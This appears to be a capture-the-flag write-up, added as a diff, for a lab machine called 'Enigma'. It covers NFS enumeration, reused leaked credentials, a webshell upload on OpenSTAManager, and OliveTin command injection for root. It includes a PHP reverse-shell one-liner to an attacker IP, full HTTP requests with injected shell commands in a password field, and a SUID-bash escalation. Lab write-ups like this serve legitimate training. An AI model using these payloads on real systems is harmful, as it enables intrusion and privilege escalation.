@@ -1,0 +1,175 @@
+[Profile]{
+Machine: Enigma
+ip: 10.129.99.217
+OS: Linux
+}
+
+[Enumeration]{
+nmap -sC -sV -Pn 10.129.99.217 -oN nmap_enigma
+22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     nginx 1.24.0 (Ubuntu)
+110/tcp  open  pop3     Dovecot pop3d
+111/tcp  open  rpcbind  2-4 (RPC #100000)
+143/tcp  open  imap     Dovecot imapd (Ubuntu)
+993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp  open  ssl/pop3 Dovecot pop3d
+
+It is more explicit in the stdout or in the file nmap_enigma: In fact we get a lot of interest informations.
+
+We see that our host run nfs, let's try nfs exploitation.
+we use nfs-common programs as showmount
+```
+$showmount -e enigma.htb 
+Export list for enigma.htb:
+/srv/nfs/onboarding *
+```
+then we mount it and found New_Employee_Access.pdf
+```
+sudo mount -t nfs 10.129.99.217:/srv/nfs/onboarding enigma_dir
+ls enigma_dir/
+New_Employee_Access.pdf
+```
+And here like you could imagine we found higly sensitive information about an employee.
+```
+Employee:Kevin Mitchell
+Department:Operations
+Provisioned by:IT Department
+Date:2024-03-01
+Webmail Access
+URL:http://mail001.enigma.htb
+Username:kevin
+Password:Enigma2024!
+```
+
+
+
+}
+
+[Exploitation]{
+we add the subdomain in the /etc/hosts and we go to connect as him.
+We connect, we note that the mail service informations 
+```
+Roundcube Webmail 1.6.16
+Copyright © 2005-2025, The Roundcube Dev Team
+
+This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
+Some exceptions for skins & plugins apply.
+
+Installed plugins
+Plugin	Version	License	Source
+archive	3.5	GPL-3.0+	
+filesystem_attachments	1.0	GPL-3.0+	
+jqueryui	1.13.2	GPL-3.0+	
+zipdownload	3.4
+```
+
+More we discover a mail from sarah giving some hints( shared drive, receiving credentials later), let's try to connect as sarah with the same password.
+It works !
+And we stumble upon this mail
+```mail
+Hi Sarah,
+
+Apologies for the delay. I have provisioned your access. Please find the details below:
+
+URL: http://support_001.enigma.htb
+Username: admin
+Password: Ne3s4rtars78s
+
+Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.
+
+Regards,
+IT Support
+Enigma Corp
+```
+
+We go in as admin in openstamanager ( we see it is version 2.9.8 )
+After crafting a special exploit.zip, we upload it on openstatmanager and got a rce through `http://support_001.enigma.htb/files/SHELL.php?c=`
+
+Now that we got the rce, we execute the php reverse shell command `php -r '$sock=fsockopen("10.10.16.55",7777);exec("/bin/bash <&3 >&3 2>&3");'`
+And we got the shell !
+}
+
+[PrivEsc]{
+Using linpeas we found many sensitive information, let's into some or one by one -_-
+mysql --user=roundcube --password='Yo270x26!gTx02' roundcubemail
+But we got nothing from it.
+mysql -u brollin --password='Fri3nds@9099' openstamanager
+And finally we got something from this one, which is the password ( hash ) of haris Ah! :)
+  Now we just cracked it and could get jump as haris ! 
+    Yes, we cracked it fine (bycrypt hash ), let's login.
+      Zuper ! *-*
+          And we got the user.txt *-*
+          
+
+We try to test Olivetin and it works for haris ( it was not working for www-data ).
+  We use port forwarding through chisel to see the web-ui.
+  And we see it is version 3000.10 ( some research should be done :)
+
+  Now we will use the information we got on it, while we connect we are guest, and as indicated in the config,yaml we saw we can execute some scripts.
+  Now what we have to exploit is the password argument according to what we search before ( cve-2026-27626 ).
+  We find that argument in the backup_script on the argument named db_pass.
+  We exploit it ( and we now have rce as root ), let's get the root.txt 
+  ```Burpsuite
+  POST /api/olivetin.api.v1.OliveTinApiService/StartAction HTTP/1.1
+Host: localhost:1337
+Content-Length: 304
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
+content-type: application/json
+sec-ch-ua-mobile: ?0
+connect-protocol-version: 1
+Accept: */*
+Origin: http://localhost:1337
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:1337/actionBinding/backup_database/argumentForm
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{"bindingId":"backup_database","arguments":[
+{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"';cp /root/root.txt /tmp/temp/here.txt; chmod 777 /tmp/temp/here.txt ; echo good || echo'"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"19c8340d-55b9-44ad-992f-d82adafad82f"}
+  ```
+And we got the root.txt! *-*
+
+Let's go play around with the root access.
+We just change the command to give suid to /bin/bash then we do in our haris shell `/bin/bash -p`
+```
+POST /api/olivetin.api.v1.OliveTinApiService/StartAction HTTP/1.1
+Host: localhost:1337
+Content-Length: 259
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
+content-type: application/json
+sec-ch-ua-mobile: ?0
+connect-protocol-version: 1
+Accept: */*
+Origin: http://localhost:1337
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:1337/actionBinding/backup_database/argumentForm
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{"bindingId":"backup_database","arguments":[
+{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'; chmod 7777 /bin/bash ; echo good || echo'"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"19c8340d-55b9-44ad-992f-d82adafad82f"}
+```
+```bash
+haris@enigma:/tmp/temp$ ls -l /bin/bash
+-rwsrwsrwt 1 root root 1446024 Mar 31  2024 /bin/bash
+haris@enigma:/tmp/temp$ /bin/bash -p bash
+/usr/bin/bash: /usr/bin/bash: cannot execute binary file
+haris@enigma:/tmp/temp$ /bin/bash -p cat /root/root.txt
+/usr/bin/cat: /usr/bin/cat: cannot execute binary file
+haris@enigma:/tmp/temp$ /bin/bash -p
+bash-5.2# whoami
+root
+
+```
+See you ! ;)
+}
